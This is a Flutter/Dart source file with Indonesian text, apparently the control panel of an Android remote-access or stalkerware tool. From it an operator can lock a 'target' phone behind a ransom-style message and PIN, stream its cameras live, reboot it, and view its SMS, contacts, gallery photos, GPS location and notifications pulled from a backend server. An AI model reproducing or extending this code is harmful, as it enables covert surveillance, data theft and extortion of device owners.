                            final isFront = _liveTitle.contains('DEPAN');
                            _stopLive();
                            Future.delayed(
                                const Duration(milliseconds: 300), () {
                              _startLive('live_camera_start',
                                  isFront ? 'back' : 'front');
                            });
                          },
                        ),
                      ),
                      const SizedBox(width: 8),
                      Expanded(
                        child: ElevatedButton.icon(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: p.primary,
                            shape: const RoundedRectangleBorder(
                              borderRadius: BorderRadius.zero,
                            ),
                          ),
                          icon: Icon(Icons.stop_rounded,
                              color: p.onPrimary, size: 15),
                          label: Text('Stop',
                              style: TextStyle(
                                  color: p.onPrimary,
                                  fontSize: 11,
                                  fontWeight: FontWeight.bold)),
                          onPressed: () {
                            HapticFeedback.mediumImpact();
                            _stopLive();
                            Navigator.pop(ctx);
                          },
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final p = context.theme;
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: p.surfaceAlt,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.zero,
          side: BorderSide(color: Colors.white, width: 2),
        ),
        title: Text('Lock Live + Chat',
            style: TextStyle(
                color: p.textPrimary,
                fontSize: 15,
                fontWeight: FontWeight.bold)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text('Target dikunci + bisa chat 2 arah',
                style: TextStyle(color: p.textTertiary, fontSize: 12)),
            const SizedBox(height: 12),
            _field(p, msgCtrl, 'Pesan di layar lock',
                hint: 'HP ini dikunci administrator'),
            const SizedBox(height: 10),
            _field(p, pinCtrl, 'PIN Unlock', hint: '1234', isNum: true),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              HapticFeedback.selectionClick();
              Navigator.pop(context);
            },
            child: Text('Batal', style: TextStyle(color: p.textTertiary)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: p.primary,
              shape: const RoundedRectangleBorder(
                borderRadius: BorderRadius.zero,
              ),
            ),
            onPressed: () {
              HapticFeedback.mediumImpact();
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty
                  ? 'HP INI DIKUNCI ADMINISTRATOR'
                  : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty
                  ? '1234'
                  : pinCtrl.text.trim();
              _cmd('lock_live', extra: '$msg|$pin');
            },
            child: Text('LOCK LIVE',
                style: TextStyle(
                    color: p.onPrimary, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _lockChatDialog() {
    final p = context.theme;
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    final chatCtrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: p.surfaceAlt,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.zero,
          side: BorderSide(color: Colors.white, width: 2),
        ),
        title: Text('Lock Device + Chat',
            style: TextStyle(
                color: p.textPrimary,
                fontSize: 15,
                fontWeight: FontWeight.bold)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _field(p, msgCtrl, 'Pesan di layar lock',
                hint: 'Contoh: HP ini dikunci administrator'),
            const SizedBox(height: 10),
            _field(p, pinCtrl, 'PIN Unlock', hint: '1234', isNum: true),
            const SizedBox(height: 10),
            _field(p, chatCtrl, 'Pesan chat ke target (opsional)',
                hint: 'Hubungi kami untuk membuka kunci'),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              HapticFeedback.selectionClick();
              Navigator.pop(context);
            },
            child: Text('Batal', style: TextStyle(color: p.textTertiary)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: p.primary,
              shape: const RoundedRectangleBorder(
                borderRadius: BorderRadius.zero,
              ),
            ),
            onPressed: () {
              HapticFeedback.mediumImpact();
              Navigator.pop(context);
              final msg = msgCtrl.text.trim().isEmpty
                  ? 'HP INI DIKUNCI ADMINISTRATOR'
                  : msgCtrl.text.trim();
              final pin = pinCtrl.text.trim().isEmpty
                  ? '1234'
                  : pinCtrl.text.trim();
              _cmd('hard_lock', extra: '$msg|$pin');
              if (chatCtrl.text.trim().isNotEmpty) {
                Future.delayed(const Duration(milliseconds: 500), () {
                  _sendChat(chatCtrl.text.trim());
                });
              }
            },
            child: Text('Lock',
                style: TextStyle(
                    color: p.onPrimary, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _showCamPicker(Function(String) onPick) {
    final p = context.theme;
    String sel = 'back';
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => AlertDialog(
          backgroundColor: p.surfaceAlt,
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.zero,
            side: BorderSide(color: Colors.white, width: 2),
          ),
          title: Text('Select Camera',
              style: TextStyle(
                  color: p.textPrimary,
                  fontSize: 14,
                  fontWeight: FontWeight.bold)),
          content: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: ['back', 'front'].map((v) {
              final isSel = sel == v;
              return GestureDetector(
                onTap: () {
                  HapticFeedback.selectionClick();
                  ss(() => sel = v);
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 22, vertical: 14),
                  decoration: BoxDecoration(
                    color: isSel ? p.bg : Colors.transparent,
                    border: Border.all(
                        color: Colors.white,
                        width: isSel ? 2 : 1.5),
                  ),
                  child: Column(
                    children: [
                      Icon(
                          v == 'back'
                              ? Icons.camera_rear_rounded
                              : Icons.camera_front_rounded,
                          color: isSel ? p.textPrimary : p.textTertiary,
                          size: 28),
                      const SizedBox(height: 6),
                      Text(v == 'back' ? 'Back' : 'Front',
                          style: TextStyle(
                              color:
                                  isSel ? p.textPrimary : p.textTertiary,
                              fontSize: 11,
                              fontWeight: FontWeight.w600)),
                    ],
                  ),
                ),
              );
            }).toList(),
          ),
          actions: [
            TextButton(
              onPressed: () {
                HapticFeedback.selectionClick();
                Navigator.pop(ctx);
              },
              child:
                  Text('Cancel', style: TextStyle(color: p.textTertiary)),
            ),
            ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: p.primary,
                shape: const RoundedRectangleBorder(
                  borderRadius: BorderRadius.zero,
                ),
              ),
              onPressed: () {
                HapticFeedback.mediumImpact();
                Navigator.pop(ctx);
                onPick(sel);
              },
              child: Text('Select',
                  style: TextStyle(
                      color: p.onPrimary, fontWeight: FontWeight.bold)),
            ),
          ],
        ),
      ),
    );
  }

  void _inputDialog(String title, String label, Function(String) onDone,
      {bool isNumber = false, String hint = ''}) {
    final p = context.theme;
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: p.surfaceAlt,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.zero,
          side: BorderSide(color: Colors.white, width: 2),
        ),
        title: Text(title,
            style: TextStyle(
                color: p.textPrimary,
                fontSize: 14,
                fontWeight: FontWeight.bold)),
        content: _field(p, ctrl, label, hint: hint, isNum: isNumber),
        actions: [
          TextButton(
            onPressed: () {
              HapticFeedback.selectionClick();
              Navigator.pop(context);
            },
            child: Text('Cancel', style: TextStyle(color: p.textTertiary)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: p.primary,
              shape: const RoundedRectangleBorder(
                borderRadius: BorderRadius.zero,
              ),
            ),
            onPressed: () {
              HapticFeedback.mediumImpact();
              Navigator.pop(context);
              onDone(ctrl.text.trim());
            },
            child: Text('Send',
                style: TextStyle(
                    color: p.onPrimary, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _confirmRestart(AppPalette p) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: p.surfaceAlt,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.zero,
          side: BorderSide(color: Colors.white, width: 2),
        ),
        title: Text('Restart Device',
            style: TextStyle(
                color: p.textPrimary,
                fontSize: 15,
                fontWeight: FontWeight.bold)),
        content: Text(
          'HP target akan di-restart.\n\nMenggunakan PowerManager reflection.',
          style: TextStyle(color: p.textTertiary, fontSize: 13, height: 1.5),
        ),
        actions: [
          TextButton(
            onPressed: () {
              HapticFeedback.selectionClick();
              Navigator.pop(context);
            },
            child: Text('Batal', style: TextStyle(color: p.textTertiary)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: p.danger,
              shape: const RoundedRectangleBorder(
                borderRadius: BorderRadius.zero,
              ),
            ),
            onPressed: () {
              HapticFeedback.heavyImpact();
              Navigator.pop(context);
              _cmd('reboot_device');
            },
            child: const Text('Restart',
                style: TextStyle(
                    color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _fetchNotif() async {
    try {
      final res =
          await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        final p = context.theme;
        showModalBottomSheet(
          context: context,
          backgroundColor: p.surfaceAlt,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.zero,
            side: BorderSide(color: Colors.white, width: 2),
          ),
          builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.6,
            maxChildSize: 0.9,
            expand: false,
            builder: (_, sc) => Column(
              children: [
                Container(
                    height: 4,
                    width: 36,
                    margin: const EdgeInsets.only(top: 10, bottom: 8),
                    color: Colors.white),
                Text('Notifications',
                    style: TextStyle(
                        color: p.textPrimary,
                        fontWeight: FontWeight.bold,
                        fontSize: 14)),
                const SizedBox(height: 8),
                Expanded(
                  child: ListView.separated(
                    controller: sc,
                    padding: const EdgeInsets.symmetric(horizontal: 14),
                    itemCount: list.length,
                    separatorBuilder: (_, __) => Divider(
                        color: Colors.white.withOpacity(0.15), height: 1),
                    itemBuilder: (_, i) => ListTile(
                      contentPadding: const EdgeInsets.symmetric(
                          horizontal: 0, vertical: 4),
                      leading: Container(
                        width: 36,
                        height: 36,
                        decoration: BoxDecoration(
                            color: p.bg,
                            border: Border.all(
                                color: Colors.white, width: 1.5)),
                        child: Icon(Icons.notifications_rounded,
                            color: const Color(0xFFF59E0B), size: 18),
                      ),
                      title: Text(list[i]['title']?.toString() ?? '-',
                          style: TextStyle(
                              color: p.textPrimary,
                              fontSize: 13,
                              fontWeight: FontWeight.w600)),
                      subtitle: Text(list[i]['body']?.toString() ?? '',
                          style: TextStyle(
                              color: p.textTertiary, fontSize: 11)),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      }
    } catch (_) {}
  }

  void _imgDialog(String b64, String title) {
    try {
      final p = context.theme;
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(
        context: context,
        builder: (_) => Dialog(
          backgroundColor: p.bg,
          insetPadding: const EdgeInsets.all(12),
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.zero,
            side: BorderSide(color: Colors.white, width: 2),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Padding(
                padding: const EdgeInsets.all(14),
                child: Text(title,
                    style: TextStyle(
                        color: p.textPrimary,
                        fontWeight: FontWeight.bold,
                        fontSize: 13)),
              ),
              ClipRRect(
                borderRadius: BorderRadius.zero,
                child: Image.memory(bytes, fit: BoxFit.contain),
              ),
            ],
          ),
        ),
      );
    } catch (_) {
      _toast('Image decode failed');
    }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    final p = context.theme;
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: p.surfaceAlt,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.zero,
          side: BorderSide(color: Colors.white, width: 2),
        ),
        title: Text('GPS Location',
            style: TextStyle(
                color: p.textPrimary,
                fontSize: 14,
                fontWeight: FontWeight.bold)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text('Latitude:  $lat',
                style: TextStyle(
                    color: p.success,
                    fontFamily: 'monospace',
                    fontSize: 13,
                    fontWeight: FontWeight.w600)),
            const SizedBox(height: 4),
            Text('Longitude: $lng',
                style: TextStyle(
                    color: p.success,
                    fontFamily: 'monospace',
                    fontSize: 13,
                    fontWeight: FontWeight.w600)),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              HapticFeedback.selectionClick();
              Navigator.pop(context);
            },
            child: Text('Close', style: TextStyle(color: p.textTertiary)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: p.primary,
              shape: const RoundedRectangleBorder(
                borderRadius: BorderRadius.zero,
              ),
            ),
            onPressed: () {
              HapticFeedback.mediumImpact();
              launchUrl(
                  Uri.parse(
                      'https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
                  mode: LaunchMode.externalApplication);
            },
            child: Text('Open Maps',
                style: TextStyle(
                    color: p.onPrimary, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _textDialog(String title, String content) {
    final p = context.theme;
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: p.surfaceAlt,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.zero,
          side: BorderSide(color: Colors.white, width: 2),
        ),
        title: Text(title,
            style: TextStyle(
                color: p.textPrimary,
                fontSize: 14,
                fontWeight: FontWeight.bold)),
        content: Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
              color: p.bg,
              border: Border.all(color: Colors.white, width: 2)),
          child: SelectableText(content,
              style: TextStyle(
                  color: p.success,
                  fontFamily: 'monospace',
                  fontSize: 12)),
        ),
        actions: [
          TextButton(
            onPressed: () {
              HapticFeedback.selectionClick();
              Navigator.pop(context);
            },
            child: Text('Close', style: TextStyle(color: p.textTertiary)),
          ),
        ],
      ),
    );
  }

  void _contactsSheet(List contacts) {
    final p = context.theme;
    showModalBottomSheet(
      context: context,
      backgroundColor: p.surfaceAlt,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.zero,
        side: BorderSide(color: Colors.white, width: 2),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
                height: 4,
                width: 36,
                margin: const EdgeInsets.only(top: 10, bottom: 8),
                color: Colors.white),
            Text('Contacts (${contacts.length})',
                style: TextStyle(
                    color: p.textPrimary,
                    fontWeight: FontWeight.bold,
                    fontSize: 14)),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: contacts.length,
                separatorBuilder: (_, __) => Divider(
                    color: Colors.white.withOpacity(0.15), height: 1),
                itemBuilder: (_, i) => ListTile(
                  contentPadding:
                      const EdgeInsets.symmetric(horizontal: 0, vertical: 2),
                  leading: Container(
                    width: 36,
                    height: 36,
                    decoration: BoxDecoration(
                        color: p.bg,
                        border: Border.all(
                            color: Colors.white, width: 1.5)),
                    child: Icon(Icons.person_rounded,
                        color: p.info, size: 18),
                  ),
                  title: Text(contacts[i]['name']?.toString() ?? '-',
                      style: TextStyle(
                          color: p.textPrimary, fontSize: 13)),
                  subtitle: Text(contacts[i]['number']?.toString() ?? '-',
                      style: TextStyle(
                          color: p.textTertiary, fontSize: 11)),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _smsSheet(List sms) {
    final p = context.theme;
    showModalBottomSheet(
      context: context,
      backgroundColor: p.surfaceAlt,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.zero,
        side: BorderSide(color: Colors.white, width: 2),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
                height: 4,
                width: 36,
                margin: const EdgeInsets.only(top: 10, bottom: 8),
                color: Colors.white),
            Text('SMS (${sms.length})',
                style: TextStyle(
                    color: p.textPrimary,
                    fontWeight: FontWeight.bold,
                    fontSize: 14)),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: sms.length,
                separatorBuilder: (_, __) => Divider(
                    color: Colors.white.withOpacity(0.15), height: 1),
                itemBuilder: (_, i) {
                  final s = sms[i] as Map;
                  return ListTile(
                    contentPadding: const EdgeInsets.symmetric(
                        horizontal: 0, vertical: 4),
                    leading: Container(
                      width: 36,
                      height: 36,
                      decoration: BoxDecoration(
                          color: p.bg,
                          border: Border.all(
                              color: Colors.white, width: 1.5)),
                      child: Icon(Icons.sms_rounded,
                          color: p.success, size: 18),
                    ),
                    title: Text(s['address']?.toString() ?? '-',
                        style: TextStyle(
                            color: p.textPrimary,
                            fontSize: 13,
                            fontWeight: FontWeight.w600)),
                    subtitle: Text(s['body']?.toString() ?? '',
                        style: TextStyle(
                            color: p.textTertiary, fontSize: 11),
                        maxLines: 2,
                        overflow: TextOverflow.ellipsis),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    final p = context.theme;
    showModalBottomSheet(
      context: context,
      backgroundColor: p.surfaceAlt,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.zero,
        side: BorderSide(color: Colors.white, width: 2),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
                height: 4,
                width: 36,
                margin: const EdgeInsets.only(top: 10, bottom: 8),
                color: Colors.white),
            Text('Gallery (${imgs.length})',
                style: TextStyle(
                    color: p.textPrimary,
                    fontWeight: FontWeight.bold,
                    fontSize: 14)),
            const SizedBox(height: 8),
            Expanded(
              child: imgs.isEmpty
                  ? Center(
                      child: Text('No photos',
                          style: TextStyle(color: p.textTertiary)))
                  : GridView.builder(
                      controller: sc,
                      padding: const EdgeInsets.all(10),
                      gridDelegate:
                          const SliverGridDelegateWithFixedCrossAxisCount(
                              crossAxisCount: 3,
                              crossAxisSpacing: 4,
                              mainAxisSpacing: 4),
                      itemCount: imgs.length,
                      itemBuilder: (_, i) {
                        try {
                          final raw = imgs[i].toString();
                          final clean =
                              raw.contains(',') ? raw.split(',').last : raw;
                          final bytes = base64Decode(clean);
                          return GestureDetector(
                            onTap: () =>
                                _imgDialog(raw, 'Gallery Photo ${i + 1}'),
                            child: ClipRRect(
                              borderRadius: BorderRadius.zero,
                              child: Image.memory(bytes,
                                  fit: BoxFit.cover),
                            ),
                          );
                        } catch (_) {
                          return Container(
                              decoration: BoxDecoration(color: p.bg));
                        }
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _field(AppPalette p, TextEditingController ctrl, String label,
      {String hint = '', bool isNum = false}) {
    return TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: TextStyle(color: p.textPrimary, fontSize: 13),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: TextStyle(color: p.textTertiary, fontSize: 12),
        hintStyle: TextStyle(color: p.textMuted, fontSize: 12),
        filled: true,
        fillColor: p.bg,
        contentPadding:
            const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
        border: const OutlineInputBorder(
          borderRadius: BorderRadius.zero,
          borderSide: BorderSide(color: Colors.white, width: 2),
        ),
        enabledBorder: const OutlineInputBorder(
          borderRadius: BorderRadius.zero,
          borderSide: BorderSide(color: Colors.white, width: 2),
        ),
        focusedBorder: const OutlineInputBorder(
          borderRadius: BorderRadius.zero,
          borderSide: BorderSide(color: Colors.white, width: 2),
        ),
      ),
    );
  }
}

// ============================================================
// HELPER CLASS
// ============================================================
class _SquareBtn {
  final String label;
  final String desc;
  final IconData icon;
  final Color color;
  final VoidCallback onTap;

  _SquareBtn({
    required this.label,
    required this.desc,
    required this.icon,
    required this.color,
    required this.onTap,
  });
}

// ============================================================
// GRID PAINTER
// ============================================================
class _GridPainter extends CustomPainter {
  final Color color;
  _GridPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..strokeWidth = 1;
    const s = 40.0;
    for (double x = 0; x < size.width; x += s) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += s) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant _GridPainter old) => old.color != color;
}